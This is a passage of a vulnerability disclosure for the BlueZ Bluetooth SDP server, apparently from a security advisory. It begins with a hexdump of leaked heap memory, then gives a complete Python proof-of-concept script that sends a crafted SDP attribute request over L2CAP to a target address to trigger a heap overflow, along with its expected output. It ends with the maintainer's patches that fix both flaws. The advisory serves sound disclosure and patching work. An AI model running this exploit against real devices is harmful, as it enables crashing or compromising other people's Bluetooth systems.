00000770  3d 22 6f 72  67 22 2f 3e  3c 2f 6e 6f  64 65 3e 00  │="or│g"/>│</no│de>·│
00000780  30 30 2d 30  30 30 30 2d  31 30 30 30  2d 38 30 30  │00-0│000-│1000│-800│
00000790  30 2d 30 30  38 30 35 66  39 62 33 34  66 62 00 00  │0-00│805f│9b34│fb··│
000007a0  00 00 24 00  00 00 30 30  30 30 31 38  30 30 2d 30  │··$·│··00│0018│00-0│
000007b0  30 30 30 2d  31 30 30 30  2d 38 30 30  30 2d 30 30  │000-│1000│-800│0-00│
000007c0  38 30 35 66  39 62 33 34  66 62 00 00  00 00 24 00  │805f│9b34│fb··│··$·│
000007d0  00 00 30 30  30 30 31 38  30 31 2d 30  30 30 30 2d  │··00│0018│01-0│000-│
000007e0  31 30 30 30  2d 38 30 30  30 2d 30 30  38 30 35 66  │1000│-800│0-00│805f│
000007f0  39 62 33 34  66 62 00 00  00 00 24 00  00 00 30 30  │9b34│fb··│··$·│··00│
00000800  30 30 36 36  37 35 2d 37  34 37 35 2d  37 32 36 35  │0066│75-7│475-│7265│
00000810  2d 36 34 36  39 2d 36 31  36 63 36 32  37 35 36 64  │-646│9-61│6c62│756d│
00000820  37 30 00 00  00 00 08 00  00 00 4d 6f  64 61 6c 69  │70··│····│··Mo│dali│
00000830  61 73 00 01  73 00 19 00  00 00 62 6c  75 65 74 6f  │as··│s···│··bl│ueto│
00000840  6f 74 68 3a  76 30 30 30  46 70 31 32  30 30 64 31  │oth:│v000│Fp12│00d1│
00000850  34 33 36 00  00 00 07 00  00 00 41 64  61 70 74 65  │436·│····│··Ad│apte│
00000860  72 00 01 6f  00 00 0f 00  00 00 2f 6f  72 67 2f 62  │r··o│····│··/o│rg/b│
00000870  6c 75 65 7a  2f 68 63 69  30 00 00 00  00 00 10 00  │luez│/hci│0···│····│
00000880  00 00 53 65  72 76 69 63  65 73 52 65  73 6f 6c 76  │··Se│rvic│esRe│solv│
00000890  65 64 00 01  62 00 00 00  00 00 00 00  00 00 1f 00  │ed··│b···│····│····│
000008a0  00 00 6f 72  67 2e 66 72  65 65 64 65  73 6b 74 6f  │··or│g.fr│eede│skto│
000008b0  70 2e 44 42  75 73 2e 50  72 6f 70 65  72 74 69 65  │p.DB│us.P│rope│rtie│
000008c0  73 00 00 00  00 00 11 02  00 00 00 00  00 00 a0 29  │s···│····│····│···)│
000008d0  41 27 aa 55  00 00 74 77  6f 72 6b 31  00 00 18 00  │A'·U│··tw│ork1│····│
000008e0  00 00 00 00  00 00 09 00  00 00 43 6f  6e 6e 65 63  │····│····│··Co│nnec│
000008f0  74 65 64 00  01 62 00 00  00 00 00 00  00 00 17 00  │ted·│·b··│····│····│
00000900  00 00 6f 72  67 2e 62 6c  75 65 7a 2e  4d 65 64 69  │··or│g.bl│uez.│Medi│
00000910  61 43 6f 6e  74 72 6f 6c  31 00 18 00  00 00 09 00  │aCon│trol│1···│····│
00000920  00 00 43 6f  6e 6e 65 63  74 65 64 00  01 62 00 00  │··Co│nnec│ted·│·b··│
00000930  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
*
00000ac0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 10 04  │····│····│····│····│
00000ad0  00 00 00 00  00 00 11 02  00 00 00 00  00 00 b0 2b  │····│····│····│···+│
00000ae0  41 27 aa 55  00 00 00 00  00 00 00 00  00 00 01 00  │A'·U│····│····│····│
00000af0  00 00 00 00  00 00 02 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000b00  00 00 00 00  00 00 05 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000b10  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000b20  00 00 00 00  00 00 00 00  00 00 00 00  00 00 0a 00  │····│····│····│····│
00000b30  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
*
00000b60  00 00 00 00  00 00 11 00  00 00 00 00  00 00 12 00  │····│····│····│····│
00000b70  00 00 00 00  00 00 13 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000b80  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
*
00000bb0  00 00 00 00  00 00 1b 00  00 00 00 00  00 00 1c 00  │····│····│····│····│
00000bc0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000bd0  00 00 00 00  00 00 1f 00  00 00 00 00  00 00 20 00  │····│····│····│·· ·│
00000be0  00 00 00 00  00 00 21 00  00 00 00 00  00 00 00 00  │····│··!·│····│····│
00000bf0  00 00 00 00  00 00 23 00  00 00 00 00  00 00 24 00  │····│··#·│····│··$·│
00000c00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
*
00000c80  00 00 00 00  00 00 00 00  00 00 00 00  00 00 36 00  │····│····│····│··6·│
00000c90  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
*
00000ce0  00 00 00 00  00 00 11 02  00 00 00 00  00 00 20 ca  │····│····│····│·· ·│
00000cf0  40 27 aa 55  00 00 00 00  00 00 00 00  00 00 60 d5  │@'·U│····│····│··`·│
00000d00  3f 27 aa 55  00 00 80 3f  40 27 aa 55  00 00 00 00  │?'·U│···?│@'·U│····│
00000d10  00 00 00 00  00 00 e0 48  40 27 aa 55  00 00 00 00  │····│···H│@'·U│····│
00000d20  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000d30  00 00 00 00  00 00 00 00  00 00 00 00  00 00 b0 54  │····│····│····│···T│
00000d40  40 27 aa 55  00 00 00 00  00 00 00 00  00 00 00 00  │@'·U│····│····│····│
00000d50  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
*
00000d70  00 00 00 00  00 00 d0 82  40 27 aa 55  00 00 80 8b  │····│····│@'·U│····│
00000d80  40 27 aa 55  00 00 a0 8c  40 27 aa 55  00 00 00 00  │@'·U│····│@'·U│····│
00000d90  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
*
00000dc0  00 00 00 00  00 00 70 a8  40 27 aa 55  00 00 50 a9  │····│··p·│@'·U│··P·│
00000dd0  40 27 aa 55  00 00 00 00  00 00 00 00  00 00 00 00  │@'·U│····│····│····│
00000de0  00 00 00 00  00 00 10 c6  40 27 aa 55  00 00 c0 c6  │····│····│@'·U│····│
00000df0  40 27 aa 55  00 00 20 c8  40 27 aa 55  00 00 00 00  │@'·U│·· ·│@'·U│····│
00000e00  00 00 00 00  00 00 60 d3  40 27 aa 55  00 00 d0 d4  │····│··`·│@'·U│····│
00000e10  40 27 aa 55  00 00 00 00  00 00 00 00  00 00 00 00  │@'·U│····│····│····│
00000e20  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
*
00000e90  00 00 00 00  00 00 00 00  00 00 00 00  00 00 d0 a2  │····│····│····│····│
00000ea0  41 27 aa 55  00 00 00 00  00 00 00 00  00 00 00 00  │A'·U│····│····│····│
00000eb0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
*
00000ef0  00 00 00 00  00 00 51 00  00 00 00 00  00 00 80 e5  │····│··Q·│····│····│
00000f00  3f 27 aa 55  00 00 2f 62  6c 75 65 74  6f 6f 74 68  │?'·U│··/b│luet│ooth│
00000f10  2f 37 30 3a  46 33 3a 39  35 3a 37 41  3a 42 39 3a  │/70:│F3:9│5:7A│:B9:│
00000f20  43 38 2f 63  61 63 68 65  2f 30 30 3a  31 41 3a 37  │C8/c│ache│/00:│1A:7│
00000f30  44 3a 44 41  3a 37 31 3a  31 31 2e 57  46 53 49 46  │D:DA│:71:│11.W│FSIF│
00000f40  5a 00 00 00  00 00 21 00  00 00 00 00  00 00 01 00  │Z···│··!·│····│····│
00000f50  00 00 17 00  00 00 18 00  00 00 19 00  00 00 30 75  │····│····│····│··0u│
00000f60  00 00 00 00  00 00 51 00  00 00 00 00  00 00 40 e1  │····│··Q·│····│··@·│
00000f70  41 27 aa 55  00 00 70 81  40 27 aa 55  00 00 20 00  │A'·U│··p·│@'·U│·· ·│
00000f80  00 00 00 00  00 00 30 00  00 00 00 00  00 00 70 81  │····│··0·│····│··p·│
00000f90  40 27 aa 55  00 00 73 76  7d 61 73 00  00 00 20 00  │@'·U│··sv│}as·│·· ·│
00000fa0  00 00 00 00  00 00 f0 c4  40 27 aa 55  00 00 50 00  │····│····│@'·U│··P·│
00000fb0  00 00 00 00  00 00 c0 00  00 00 00 00  00 00 00 00  │····│····│····│····│
00000fc0  00 00 00 00  00 00 00 12  41 27 aa 55  00 00 18 00  │····│····│A'·U│····│
00000fd0  00 00 20 00  00 00 00 00  00 00 00 00  00 00 ff ff  │·· ·│····│····│····│
00000fe0  ff ff ff ff  ff ff ff ff  ff ff ff ff  ff ff ff ff  │····│····│····│····│
*
00001000  ff ff ff ff  ff ff 08 56  4c a5 5a c8  10 00 00     │····│···V│L·Z·│···│
0000100f
```
Heap Overflow Exploit:
```python
from pwn import *
import bluetooth
if not 'TARGET' in args:
    log.info("Usage: sdp_heapoverflow_poc.py TARGET=XX:XX:XX:XX:XX:XX")
    exit()
# the service from which we want to request attributes (GAP)
SERVICE_REC_HANDLE = 0x00010001
target = args['TARGET']
mtu = 65535
attrcount = 1000 # how often to request the attribute
context.endian = 'big'
def sdppacket(handle, attr):
    pkt = ""
    pkt += p32(handle) # handle
    pkt += p16(0xFFFF) # max_rsp_size
    # contains an attribute sequence with the length describing the attributes being 16 bit long
    # see extract_des function in line 113 of src/sdpd-request.c
    pkt += p8(0x36)         # DTD (seq_type SDP_SEQ16)
    pkt += p16(len(attr))   # seq size, 16 bit according to DTD
    # attributes
    pkt += attr
    pkt += p8(0x00) # Cstate len
    pduhdr = ""
    pduhdr += p8(0x04) # pdu_id 0x04 -> SVC_ATTR_REQ
    pduhdr += p16(0x0000) # tid
    pduhdr += p16(len(pkt)) # plen
    return pduhdr + pkt
if __name__ == '__main__':
    log.info('Creating L2CAP socket')
    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bluetooth.set_l2cap_mtu(sock, mtu)
    log.info('Connecting to target')
    sock.connect((target, 1))
    # the attribute we want to request (multiple times)
    # to create the largest response possible, we request a
    # range of attributes at once.
    # for more control during exploitation, it would also be possible to request
    # single attributes.
    attr = p8(0x0A) # data type (SDP_UINT_32)
    attr += p16(0x0000) # attribute id start
    attr += p16(0xFFFE) # attribute id end
    sdp = sdppacket(SERVICE_REC_HANDLE, attr*attrcount)
    log.info("packet length: %d bytes" % len(sdp))
    log.info('Triggering heap overflow...')
    sock.send(sdp)
```

If everything happens as expected, we shall get a similar output to this:

```dump
[*] Creating L2CAP socket
[*] Connecting to target
[*] packet length: 5015 bytes
[*] Triggering heap overflow...
```

**Patches suggested by Luiz Augusto von Dentz**<br>
SDP Info leak patch:<br>
```c
From 00d8409234302e5e372af9b4cc299b55faecb0a4 Mon Sep 17 00:00:00 2001
From: Luiz Augusto von Dentz <luiz.von.dentz@intel.com>
Date: Fri, 28 Sep 2018 15:04:42 +0300
Subject: [PATCH BlueZ 1/2] sdp: Fix not checking if cstate length
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

cstate length should be smaller than cached length otherwise the
request shall be considered invalid as the data is not within the
cached buffer.

An independent security researcher, Julian Rauchberger, has reported
this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure
program.
---
 src/sdpd-request.c | 74 ++++++++++++++++++++++++----------------------
 1 file changed, 39 insertions(+), 35 deletions(-)

diff --git a/src/sdpd-request.c b/src/sdpd-request.c
index 318d04467..deaed266f 100644
--- a/src/sdpd-request.c
+++ b/src/sdpd-request.c
@@ -70,9 +70,16 @@ static sdp_buf_t *sdp_get_cached_rsp(sdp_cont_state_t *cstate)
 {
 	sdp_cstate_list_t *p;

-	for (p = cstates; p; p = p->next)
-		if (p->timestamp == cstate->timestamp)
+	for (p = cstates; p; p = p->next) {
+		/* Check timestamp */
+		if (p->timestamp != cstate->timestamp)
+			continue;
+
+		/* Check if requesting more than available */
+		if (cstate->cStateValue.maxBytesSent < p->buf.data_size)
 			return &p->buf;
+	}
+
 	return 0;
 }

@@ -624,6 +631,31 @@ static int extract_attrs(sdp_record_t *rec, sdp_list_t *seq, sdp_buf_t *buf)
 	return 0;
 }

+/* Build cstate response */
+static int sdp_cstate_rsp(sdp_cont_state_t *cstate, sdp_buf_t *buf,
+							uint16_t max)
+{
+	/* continuation State exists -> get from cache */
+	sdp_buf_t *cache = sdp_get_cached_rsp(cstate);
+	uint16_t sent;
+
+	if (!cache)
+		return 0;
+
+	sent = MIN(max, cache->data_size - cstate->cStateValue.maxBytesSent);
+	memcpy(buf->data, cache->data + cstate->cStateValue.maxBytesSent, sent);
+	buf->data_size += sent;
+	cstate->cStateValue.maxBytesSent += sent;
+
+	SDPDBG("Response size : %d sending now : %d bytes sent so far : %d",
+		cache->data_size, sent, cstate->cStateValue.maxBytesSent);
+
+	if (cstate->cStateValue.maxBytesSent == cache->data_size)
+		return sdp_set_cstate_pdu(buf, NULL);
+
+	return sdp_set_cstate_pdu(buf, cstate);
+}
+
 /*
  * A request for the attributes of a service record.
  * First check if the service record (specified by
@@ -633,7 +665,6 @@ static int extract_attrs(sdp_record_t *rec, sdp_list_t *seq, sdp_buf_t *buf)
 static int service_attr_req(sdp_req_t *req, sdp_buf_t *buf)
 {
 	sdp_cont_state_t *cstate = NULL;
-	uint8_t *pResponse = NULL;
 	short cstate_size = 0;
 	sdp_list_t *seq = NULL;
 	uint8_t dtd = 0;
@@ -719,24 +750,8 @@ static int service_attr_req(sdp_req_t *req, sdp_buf_t *buf)
 	buf->buf_size -= sizeof(uint16_t);

 	if (cstate) {
-		sdp_buf_t *pCache = sdp_get_cached_rsp(cstate);
-
-		SDPDBG("Obtained cached rsp : %p", pCache);
-
-		if (pCache) {
-			short sent = MIN(max_rsp_size, pCache->data_size - cstate->cStateValue.maxBytesSent);
-			pResponse = pCache->data;
-			memcpy(buf->data, pResponse + cstate->cStateValue.maxBytesSent, sent);
-			buf->data_size += sent;
-			cstate->cStateValue.maxBytesSent += sent;
-
-			SDPDBG("Response size : %d sending now : %d bytes sent so far : %d",
-				pCache->data_size, sent, cstate->cStateValue.maxBytesSent);
-			if (cstate->cStateValue.maxBytesSent == pCache->data_size)
-				cstate_size = sdp_set_cstate_pdu(buf, NULL);
-			else
-				cstate_size = sdp_set_cstate_pdu(buf, cstate);
-		} else {
+		cstate_size = sdp_cstate_rsp(cstate, buf, max_rsp_size);
+		if (!cstate_size) {
 			status = SDP_INVALID_CSTATE;
 			error("NULL cache buffer and non-NULL continuation state");
 		}
@@ -786,7 +801,7 @@ done:
 static int service_search_attr_req(sdp_req_t *req, sdp_buf_t *buf)
 {
 	int status = 0, plen, totscanned;
-	uint8_t *pdata, *pResponse = NULL;
+	uint8_t *pdata;
 	unsigned int max;
 	int scanned, rsp_count = 0;
 	sdp_list_t *pattern = NULL, *seq = NULL, *svcList;
@@ -915,19 +930,8 @@ static int service_search_attr_req(sdp_req_t *req, sdp_buf_t *buf)
 		} else
 			cstate_size = sdp_set_cstate_pdu(buf, NULL);
 	} else {
-		/* continuation State exists -> get from cache */
-		sdp_buf_t *pCache = sdp_get_cached_rsp(cstate);
-		if (pCache && cstate->cStateValue.maxBytesSent < pCache->data_size) {
-			uint16_t sent = MIN(max, pCache->data_size - cstate->cStateValue.maxBytesSent);
-			pResponse = pCache->data;
-			memcpy(buf->data, pResponse + cstate->cStateValue.maxBytesSent, sent);
-			buf->data_size += sent;
-			cstate->cStateValue.maxBytesSent += sent;
-			if (cstate->cStateValue.maxBytesSent == pCache->data_size)
-				cstate_size = sdp_set_cstate_pdu(buf, NULL);
-			else
-				cstate_size = sdp_set_cstate_pdu(buf, cstate);
-		} else {
+		cstate_size = sdp_cstate_rsp(cstate, buf, max);
+		if (!cstate_size) {
 			status = SDP_INVALID_CSTATE;
 			SDPDBG("Non-null continuation state, but null cache buffer");
 		}
--
2.17.1
```
SDP Heap Overflow patch:

```c
From 6632f256515ed4bd603a8ccb3b8bdd84fd5cc181 Mon Sep 17 00:00:00 2001
From: Luiz Augusto von Dentz <luiz.von.dentz@intel.com>
Date: Fri, 28 Sep 2018 16:08:32 +0300
Subject: [PATCH BlueZ 2/2] sdp: Fix buffer overflow
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

sdp_append_buf shall check if there is enough space to store the data
before copying it.

An independent security researcher, Julian Rauchberger, has reported
this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure
program.
---
 lib/sdp.c | 6 ++++++
 1 file changed, 6 insertions(+)

diff --git a/lib/sdp.c b/lib/sdp.c
index eb408a948..84311eda1 100644
--- a/lib/sdp.c
+++ b/lib/sdp.c
@@ -2834,6 +2834,12 @@ void sdp_append_to_buf(sdp_buf_t *dst, uint8_t *data, uint32_t len)
 	SDPDBG("Append src size: %d", len);
 	SDPDBG("Append dst size: %d", dst->data_size);
 	SDPDBG("Dst buffer size: %d", dst->buf_size);
+
+	if (dst->data_size + len > dst->buf_size) {
+		SDPERR("Cannot append");
+		return;
+	}
+
 	if (dst->data_size == 0 && dtd == 0) {
 		/* create initial sequence */
 		*p = SDP_SEQ8;
--
2.17.1
```
